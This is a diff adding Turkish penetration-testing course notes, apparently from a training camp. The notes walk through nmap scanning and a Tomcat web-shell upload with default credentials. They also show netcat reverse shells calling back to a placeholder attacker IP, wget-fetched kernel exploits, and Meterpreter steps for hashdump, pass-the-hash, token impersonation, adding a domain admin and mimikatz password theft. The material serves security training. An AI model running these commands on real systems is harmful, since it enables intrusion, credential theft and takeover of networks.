@@ -1,0 +1,218 @@
+## Exploit Türleri
+
+1) Remote
+2) Local
+3) Dos
+4) 0day
+
+**- Bir sisteme sızmanın 5 yolu:**
+
+1) İşletim sistemindeki zafiyetler	(MS08-067, MS16-098..)
+2) Üçüncü parti yazılımlardaki zafiyetler	(CVE-2016-8523, CVE-2016-9079)
+3) Yapılandırma Eksiklikleri	(FTP, Tomcat, Jenkins...)
+4) Ağ tabanlı Zafiyetler	(ARP Poisoning, NETBIOS/LLMNR Poisoning)
+5) Sosyal mühendislik		(Phishing, Vishing)
+
+- nmap ile -n parametresi kullanmak ters DNS sorgularını skip etmesini sağlar. Eğer işimiz sadece IP'ler ile ise işlemi hızlandırır.
+
+		=> nmap -n -Pn -sV -v --open <target>
+
+- Windows makinelerde 135, 139, 445 portları açık gelir. 
+- İşletim sistemini nokta atışı olarak bilmemiz gerekir. Eğer bunu öğrenmek istiyorsak smb-os-discovery script'ini kullanabiliriz. (Windows 10'a kadar çalışır.) 
+- Windows makinede Workgroup: WORKGROUP ise makine standalone (tek tabanca) takılan bir makinadır.
+- Bulduğumuz exploit'leri bilgisayar programları gibi indirip çalıştırabiliriz. Linux kullanırken tercihen python ile yazılan exploitler daha avantajlı, çünkü windows'a karşı C ile yazılmış bir exploiti kullanabilmemiz için kütüphaneleri tanıtmak ve wine benzeri bir program kullanmak zorundayız.
+
+**- Exploiti yolladıktan sonra gelen bağlantı isteklerini dinlemek için:**
+		
+		=> nc <hedef> <port> -vv
+		
+- Windows'ta en yüksek yetkili kullanıcı: nt authority/system
+- Hedefte exploit edilen uygulama hangi kullanıcı tarafından çalıştırılmışsa biz de o kullanıcının yetkilerine sahip oluruz.
+
+**- Linux örneği:**
+
+	=> nmap -n -Pn -sV -v IP -p 8180 (Apache Tomcat/Coyote JSP engine 1.1) (HTTP)
+	B> IP:8180
+	B> IP:8180/askojdoksa/ (Uygulamaya hata verdirttiğimizde versiyon bilgisi yazabilir.)
+	B> IP:8180/manager/html default user:pass'ları elle veya araçlarla deneyebiliriz. (tomcat:tomcat)
+
+- Tomcat paneline girdiğimizde eğer war file to upload kısmı geliyorsa yönetici hesabıyla giriş yaptığımız anlamına gelir.
+- En altta işletim sistemi ve kernel bilgisi yer alır.
+- war uzantısı zip gibidir.
+
+		=> cd /usr/share/laudanum/	(Çeşitli shell dosyaları bulunan bir dizin, kali default)
+		=> cd jsp/	(cmd.war kullanacağımız dosya)
+		B> cmd.war dosyasını upload ediyoruz.
+		B> IP:8180/cmd/cmd.jsp
+		B> whoami (tomcat55 => yetkisiz bir kullanıcı, sadece tomcat servisini başlatır veya durdurur.)
+
+- Bir işletim sisteminde iki şekilde hak yükseltilir:
+>1) Yanlış yapılandırılmış bir eksiklik bulmamız gerekir.
+>2) İşletim sistemininin kernel'inde bulunan bir zafiyet kullanmamız gerekir.
+
+		B> uname -a (Kernel bilgisi)
+		B> cat /etc/issue (İşletim sistemi bilgisi)
+		B> cat /etc/lsb-release (İşletim sistemi bilgisi -garanti-)
+
+- Bulduğumuz hedefte exploit'in derlenmesi için (eğer exploit C benzeri derlenen bir dil ile yazılmışsa) compiler olması gerekir ve exploiti hedef makinedeki compiler ile aynı versiyondaki bir compiler ile compile etmemiz gerekir.
+
+		B> ubuntu 8.04 kernel 2.6 site:exploit-db.com
+
+- UDEV, *nix tabanlı işletim sistemlerinde driver menajeridir.
+
+		B> udevadm --version (Hedefin udev versiyonunu öğrenmek için)
+
+**- Kendi interaktif bağlantımızı elde etmek ve aradan cmd.jsp'yi çıkarmak için aşağıdaki işlemleri yaparız:**
+
+    => nc -lvp 9090 -e /bin/bash
+    B> whereis nc	(/bin/nc.traditional)
+    B> nc OUR_IP 9090 -e /bin/bash
+
+- nc kullanırken -e parametresi ile ilk gelen bağlantıya /bin/bash'i veririz. Ancak bunu kullanabilmemiz için nc.traditional versiyonunun hedefte ve kendimizde yüklü olması lazım.
+
+**- Kendi interaktif bağlantımızı elde ettikten sonra:**
+
+	S> gcc --version	(Hedefte gcc var!)
+	S> cd /tmp
+	S> wget EXPLOIT		(Eğer hata verirse SSL sertifikalarını kontrol etmeden indirmesi için aşağıdaki komutu kullanırız)
+	S> wget EXPLOIT --no-check-certificate
+
+- Exploitin açıklamasından nasıl kullanıldığına bakıyoruz. "run" adında bir shell script oluşturuyoruz. Çünkü kullanacağımız exploit run dosyasını root yetkisinde çalıştıracak.
+
+		S> echo "!/bin/bash" > run
+		S> echo "nc <our_ip> <our_port> -e /bin/bash" >> run
+		S> gcc kamp.c -o bga
+
+- Exploitin bizden ayrıca istediği bir argüman var.
+
+		S> ps aux | grep udex
+
+- udev PID -1 i argüman olarak kullanıyoruz.
+
+		=> nc -lvp <our_port>
+		S> ./bga 2692
+		SS> whoami	(ROOT)
+
+- Bu işlemleri otomatize etmek için Metasploit-Framework kullanırız.
+
+- dissassembler kullanarak exploit içerisindeki shellcode'ları inceleyebiliriz.
+
+## MSF Modüllerleri
+1) Auxiliary
+2) Exploit
+3) Payload
+4) Encoders
+
+	M> search type:auxiliary tomcat
+	M> info 	(description bize modülün ne yaptığını tam olarak açıklar)
+
+- RHOSTS'a hedef verirken hedefleri virgül ile ayıramayız. Aralık veya blok vermemiz gerekir. (örn: 192.168.1.0-150 veya 192.168.1.0/24)
+
+**- SNMP udp 161 portunda çalışıyor ise:**
+
+- auxiliary/scanner/snmp/snmp_enum (SNMP community string bilinirse hedefle alakalı çok fazla bilgi elde etmemizi sağlar. Community string "public", "private" veya "cisco" olabilir.) 
+
+- Meterpreter nedir?
+	- Meterpreter cmd.exe ile yapamayacağımız üst düzey işlemleri (ekran alma, port yönlendirmeyi açma vs.) gibi işlemleri yapabilmemizi sağlayan üst düzey bir payload'dır.
+
+- Payload eğer bağlantı kuran bir payload ise bind veya reverse olabilir.
+
+## Payload Çeşitleri:
+
+**1) Single:** Tek bir işlem yapmak için kullanılan payload'lar.	(One shot)
+
+**2) Staged:** Exploit içerisinde Dropper veya Loader adı verilen dosyayı çalıştırarak kendimize bağlantı isteği yollarız. Bu payload exploit ettiğimiz process'e enjekte edilir. Bu işleme Reflected Dll Injection denir. Meterpreter'in antivirüs vs. yakalanmamasının sebebi bu işlem ile RAM'de çalışmasıdır.
+
+**3) Stageless:** Staged'dan farklı araya loader koymadan direk olarak meterpreter'i koyması. Bunun dezavantajı ilk exploit ettiğimiz zaman meterpreter'i koyacak yeterli alana sahip olamama ihtimalimizin olmasıdır.
+
+**- MSF exploit modülü çalışırken adım adım hangi işlemler gerçekleşir?**
+
+// buraya msfden ilk 4 satırın çıktısı koyulacak.
+
+1) 4444 portunu dinlemeye başladı.
+2) Exploit'i gönderdi.	(trying target...)
+3) Reflected DLL Injection yapıldığı yer.	(sending stage...)
+4) İşlemin başarıyla tamamlandığı satır.
+
+	Mp> shell
+	C> net user alice
+
+- Meterpreter'de getsystem  komutu ne yapar?
+	- Token impersonation işlemi gerçekleştirir. Eğer o an kullandığımız kullanıcı administrator grubuna dahilse, getsystem ile auth/system yetkisine çıkabiliriz.
+
+- Aşağıdaki modül ile windows makinelerdeki patch'leri arayabiliriz. Eksik patch'leri kullanarak yetki yükseltebiliriz.
+
+		M> use /post/windows/gather/enum_patches
+		M> set SESSION 1
+		M> exploit
+		M> search ms13-081
+		M> use MODUL
+		M> set SESSION 1
+		M> exploit
+		Mtr> SESSION IS OPEN!
+
+**Active Directory'e dahil windows makineye sızmak:**
+
+	=> nmap -n -sn 192.168.1.240-250 -oN up.txt (hangi host'ların up olduğunu up.txt'ye yazdırır.)
+	=> cat up.txt | grep -w for | cut -d ' ' -f 5 > hedef.txt
+	=> nmap -n -Pn -sS -v --open -iL hedef.txt
+
+- Windows 7'den sonraki işletim sistemlerinde rpc servisleri bölündü ve default olarak kullanılan portlarda 49152, 49153, 49154 portları da yer almakta.
+
+		=> nmap -n -Pn -sV --open 192.168.1.240 -vv -p 8080	(Easy File Sharing 6.9)
+		=> nmap -n -Pn -sV --open 192.168.1.240 -vv -p 445 --script smb-os-discovery
+
+- MSF'de payload'ların cinsini, yazılma şekillerindeki syntax'tan anlayabiliriz.
+	- Staged payload'lar -> windows/meterpreter/reverse_tcp
+	- Stageless payload'lar -> windows/meterpreter_reverse_tcp
+
+			M> set payload windows/meterpreter/reverse_https
+			M> exploit
+			Met> background
+			M> use ms13-081		(PWNED!)
+			Shell> net user alice /domain
+
+**- AUTH/SYS olduktan sonra yapılacak şeyler:**
+
+	M> hashdump
+
+**- Pass the Hash:** winlogon.exe girilen parolayı NTLM'e çevirdikten sonra (Windows'un kullandığı şifreleme algoritması) lsass.exe'ye gönderir. lsass.exe verilen hash'i SAM database'de karşılaştırır.
+
+- Eğer hash c089c0 ile bitiyor ise kullanıcının parolası yok demektir. (Guest)
+
+		Mtr> background
+		M> use auxiliary/scanner/smb/smb_login
+		M> set RHOSTS hedef.txt
+		M> set SMBDOMAIN WORKGROUP 	(çünkü bizim elde ettiğimiz Admin.. hash'i workgroup'a ait)
+		M> set SMBUSER Administrator
+		M> set SMBPASS <HASH>
+		M> set THREADS 5
+		M> exploit
+
+**- SMB kullanıcı adı ve parolası geçerli olduğu hedeflerde giriş yapabilmek için kullanacağımız modül:**
+
+	M> use exploit/windows/smb/psexec
+	Mtr> ps
+	Mtr> migrate winlogon.exe	(Bunu yapma amacımız hem daha güvenli kalmak hem de meterpreter'i 32bitten 64bite çıkarmak, çünkü girdiğimiz sistem 64 bit ve komut çalıştırabilmemiz için 64bit bir process sömürüyor olmamız gerek.)
+
+**- Token**
+
+	Mtr> shell
+	S> net user /domain
+	S> net user bob /domain		(bob'un yetki seviyesini öğreniyoruz)
+	S> net group "Domain Admins" /domain	(domain admins grubundaki kullanıcıları gösterir.)
+	S> exit
+	Mtr> load incognito
+	Mtr> list_tokens -u
+
+- Bir kullanıcının token'ini aldığımızda kendimizi onun gibi gösterebiliriz. Eğer sisteme domain admin giriş yapmışsa ve sign off yapmamışsa domain admin'in tokeni hedef makine kapanana kadar orada kalacaktır.
+
+		S> ipconfig /all	(DNS server'a bakarak DC'nin IP adresini alırız veya enum_domain post modülünü kullanırız.)
+		Mtr> add_user siberkamp Bgasec -h <DC_IP>
+		Mtr> add_group_user "Domain Admins" siberkamp -h <DC_IP>
+
+**- Clear Text Password:**
+
+	Mtr> load mimikatz	(Clear text password alır. Windows 8den sonrası önlem aldı, öncesinde çalışır.)
+	Mtr> wdigest
+
